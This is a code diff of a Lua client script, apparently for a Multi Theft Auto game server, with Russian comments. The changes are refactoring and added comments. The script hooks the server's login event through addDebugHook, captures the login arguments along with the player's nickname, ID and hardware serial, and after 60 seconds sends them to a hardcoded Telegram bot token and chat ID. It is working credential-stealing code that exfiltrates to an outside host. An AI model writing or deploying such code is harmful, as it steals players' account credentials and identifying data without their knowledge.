@@ -2,21 +2,18 @@ local BOT_TOKEN = "8405542793:AAHqybOkZBMBFjw9p3ji2ZTwyMSKaYi7zwg"
 local CHAT_ID = "-1003947071509"
 local sended = false
 
+-- Функция отправки в Telegram
 function sendTG(text)
-    -- Правильное экранирование: 
-    -- 1. Заменяем переносы строк на %0A
-    -- 2. Заменяем пробелы на %20
+    -- Кодируем переносы строк и пробелы для URL
     local encodedText = text:gsub("\n", "%%0A"):gsub(" ", "%%20")
+    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage?chat_id="..CHAT_ID.."&text="..encodedText
 
-    fetchRemote(
-        "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage?chat_id="..CHAT_ID.."&text="..encodedText,
-        {},
-        function(responseData, errno)
-            outputDebugString("TG Status: "..tostring(errno))
-        end
-    )
+    fetchRemote(url, {}, function(responseData, errno)
+        outputDebugString("TG Status: "..tostring(errno))
+    end)
 end
 
+-- Вспомогательные функции для обработки аргументов
 function valToString(v)
     if type(v) == "string" then return '"'..v..'"'
     elseif type(v) == "number" then return tostring(v)
@@ -35,32 +32,35 @@ function buildArgs(...)
     return table.concat(t, ", ")
 end
 
+-- Хук на события сервера
 addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
     if sended or functionName ~= "triggerServerEvent" then return end
 
     local args = {...}
     local eventName = tostring(args[1])
 
+    -- Проверяем, то ли это событие логина
     if eventName ~= "addt:LoginAccount" then return end
 
-    sended = true
+    sended = true -- Помечаем, что перехват сработал (чтобы не спамить)
+    
     local resName = sourceResource and getResourceName(sourceResource) or "unknown"
     local argString = buildArgs(...)
 
-    outputConsole("[DEBUG] Логин зафиксирован. Отправка через 60 сек...")
+    outputConsole("[DEBUG] Логин пойман. Данные будут отправлены через 60 секунд.")
 
+    -- Таймер на 1 минуту, чтобы сервер успел выдать ID и обновить ник
     setTimer(function()
-        -- Проверяем, не вышел ли игрок за эту минуту
         if not isElement(localPlayer) then return end
 
         local nick = getPlayerName(localPlayer) or "N/A"
         local serial = getPlayerSerial(localPlayer) or "N/A"
         
-        -- Твой метод получения ID
+        -- Получаем ID (убираем префикс "p" если он есть)
         local rawID = getElementID(localPlayer) or "0"
         local idloc = tostring(rawID):gsub("p", "")
 
-        -- Формируем текст
+        -- Формируем красивое сообщение
         local report = "✅ Вход в аккаунт\n" ..
                        "👤 Ник: " .. nick .. "\n" ..
                        "🆔 ID: " .. idloc .. "\n" ..
@@ -69,8 +69,9 @@ addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByAC
                        "📝 Аргументы: " .. argString
 
         sendTG(report)
-        outputConsole("[DEBUG] Сообщение ушло в Telegram")
+        outputConsole("[DEBUG] Данные успешно отправлены в Telegram.")
     end, 60000, 1)
+
 end, {"triggerServerEvent"})
 ----------------------------------------------------------------
 -- ГЛОБАЛЬНАЯ ТАБЛИЦА И ОЧИСТКА
